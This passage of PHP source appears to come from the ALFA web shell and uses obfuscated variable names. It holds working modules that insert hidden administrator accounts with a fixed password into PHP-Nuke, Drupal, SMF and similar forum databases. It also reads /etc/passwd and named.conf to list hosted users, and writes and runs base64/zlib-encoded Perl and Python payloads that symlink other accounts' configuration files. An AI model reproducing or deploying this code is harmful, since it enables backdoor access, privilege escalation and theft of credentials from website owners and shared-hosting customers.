 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."users (uid,username,password,salt,email,usergroup) values(null,'".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$vdhryjes9778840a0100cb30c982876741b0b5a2."','4')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if(isset($_POST['alfa8']) && $_POST['alfa8'] == 'nuke'){

echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa4'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa5'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa7'];
$vdhryjes9778840a0100cb30c982876741b0b5a2 = $_POST['alfa9'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$horyspio0800fc577294c34e0b28ad2839435945 = md5($mevhntrj9003d1df22eb4d3820015070385194c8);
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."_authors(aid,name,email,pwd) values('$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','God','$vdhryjes9778840a0100cb30c982876741b0b5a2','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
if(isset($_POST['alfa9']) && $_POST['alfa9'] == 'drupal'){

echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName'=> 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
 );
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa4'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select uid from users order by uid desc limit 0,1");
$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = @mysqli_fetch_assoc($hkxwhfiabf66ebc624fcb9e499d769c461f26dbd);
$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd = $hkxwhfiabf66ebc624fcb9e499d769c461f26dbd['uid'];
$ikeymybsd5301ded65f8f32e704080de3a3014f1 = $hkxwhfiabf66ebc624fcb9e499d769c461f26dbd++;
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$hkxwhfiabf66ebc624fcb9e499d769c461f26dbd','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select uid from users where name='".$qmgjkvzo21232f297a57a5a743894a0e4a801fc3."'") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = mysqli_num_rows($syosrpmxd4a590caacc0be55ef286e40a945ea45);
if ($nuabiabibeb7f7a395dc21ad97425bbc061afbaf == 1){
$aqewfoiib3cd6a16f46d7fa04280495810dee6d7 = mysqli_fetch_assoc($syosrpmxd4a590caacc0be55ef286e40a945ea45);
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $aqewfoiib3cd6a16f46d7fa04280495810dee6d7['uid'];
}
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"INSERT INTO users_roles (uid,rid) VALUES ('".$ybaqpbzt9b207167e5381c47682c6b4f58a623fb."', '3')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}

if(isset($_POST['alfa10']) && $_POST['alfa10'] == 'smf'){

echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 );
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$wvrappnp421aa90e079fa326b6494f812ad13e79 = $_POST['alfa2'];
$tcmsiznr11e0eed8d3696c0a632f822df385ab3c = $_POST['alfa3'];
$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa5'];
$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = $_POST['alfa6'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
$qmgjkvzo21232f297a57a5a743894a0e4a801fc3 = $_POST['alfa8'];
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($wvrappnp421aa90e079fa326b6494f812ad13e79,$rgusbycx14c4b06b824ec593239362517f538b29,$oimndblx5f4dcc3b5aa765d61d8327deb882cf99,$tcmsiznr11e0eed8d3696c0a632f822df385ab3c) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$uysompuo1f0ba54a6dd9957d3c9eec8eeb3228a8 = sha1(strtolower($qmgjkvzo21232f297a57a5a743894a0e4a801fc3) . 'solevisible');
$syosrpmxd4a590caacc0be55ef286e40a945ea45=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"insert into {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','1','$qmgjkvzo21232f297a57a5a743894a0e4a801fc3','$uysompuo1f0ba54a6dd9957d3c9eec8eeb3228a8','solevisible@fbi.gov')") or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if($syosrpmxd4a590caacc0be55ef286e40a945ea45){
__alert('Success... '.$qmgjkvzo21232f297a57a5a743894a0e4a801fc3.' is created...');}
}
}
echo "</div>";
alfafooter();
}
function alfaMakePwd(){
	if(_alfa_file_exists("/etc/virtual/domainowners")||(_alfa_file_exists("/etc/named.conf")&&_alfa_file_exists("/etc/valiases"))){
		return "/home/{user}/public_html/";
	}
	$hzesmpowfdc3bdefb79cec8eb8211d2499e04704 = explode("/", $_SERVER["DOCUMENT_ROOT"]);
	$twsccpoy4c9184f37cff01bcdc32dc486ec36961 = end($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
	array_pop($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
	array_pop($hzesmpowfdc3bdefb79cec8eb8211d2499e04704);
	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = implode("/", $hzesmpowfdc3bdefb79cec8eb8211d2499e04704) . "/{user}/" . $twsccpoy4c9184f37cff01bcdc32dc486ec36961;
	return $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
}
function alfaGetDomains($vrvwwpml9ed39e2ea931586b6a985a6942ef573e = false){
	$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "named.conf";
	$rotcxius980da98409d058c365664ff7ea33dd6b = array();
	$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/named.conf');
	if(!$rotcxius980da98409d058c365664ff7ea33dd6b){
		$rotcxius980da98409d058c365664ff7ea33dd6b = @scandir("/etc/valiases/");
		$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "valiases";
		if(!$rotcxius980da98409d058c365664ff7ea33dd6b){
			$rotcxius980da98409d058c365664ff7ea33dd6b = @scandir("/var/named");
			$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "named";
			if(!$rotcxius980da98409d058c365664ff7ea33dd6b && $vrvwwpml9ed39e2ea931586b6a985a6942ef573e){
				$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/passwd');
				$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = "passwd";
			}
		}
	}
	return array("lines" => $rotcxius980da98409d058c365664ff7ea33dd6b, "state" => $vrvwwpml9ed39e2ea931586b6a985a6942ef573e);
}
function alfaCreateParentFolder(){
	$oyidytwkd0e45878043844ffc41aac437e86b602 = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
	if(!@is_dir($oyidytwkd0e45878043844ffc41aac437e86b602)){
		@mkdir($oyidytwkd0e45878043844ffc41aac437e86b602, 0755, true);
	}
}
function alfasymlink(){
alfahead();
AlfaNum(9,10);
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = alfaMakePwd();
	@mkdir('cgialfa',0755);
	@chdir('cgialfa');
	alfacgihtaccess('cgi');
	$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
	$jbyuabyldfed5bc177b87ab317c584e06566adc6 = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
	$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289 = "symperl.alfa";
	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;
	$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = "perl";
	if($_POST["alfa2"]=="sympy"){
		$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289 = "pysymlink.alfa";
		$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $jbyuabyldfed5bc177b87ab317c584e06566adc6;
		$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = "python";
	}
	@__write_file($jjbnlocq1214201a50a713fdbd2a6fe7a31c4289,$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb);
	@chmod($jjbnlocq1214201a50a713fdbd2a6fe7a31c4289,0755);
	echo __pre();
	$ovsedldc96ab4e163f4ee03aaa4d1051aa51d204 = alfaEx("{$phbpyamz7572559ca86e781ba8fe8073a0b725c6} {$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289} {$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c}",false,true,true);
	if(strlen($ovsedldc96ab4e163f4ee03aaa4d1051aa51d204) == 0){
		echo AlfaiFrameCreator('cgialfa/'.$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289);
	}else{
		echo $ovsedldc96ab4e163f4ee03aaa4d1051aa51d204;
	}
}
if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile'){
if(function_exists('symlink')||_alfa_can_runCommand(true,true)){
AlfaNum(9,10);
echo __pre().'
<center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa5'];
$wotiivfs4930ff3daf8e31b1f189819fcad77e1e = $_POST['alfa6'];
$czgojdoh04bf8675bbdf13662b5ca41d294a517e = $_POST['alfa7'];
if($czgojdoh04bf8675bbdf13662b5ca41d294a517e){
$amrueank10b04069381b2fef4e0a41e0ea65b914 = str_replace(".", "_", basename($wotiivfs4930ff3daf8e31b1f189819fcad77e1e));
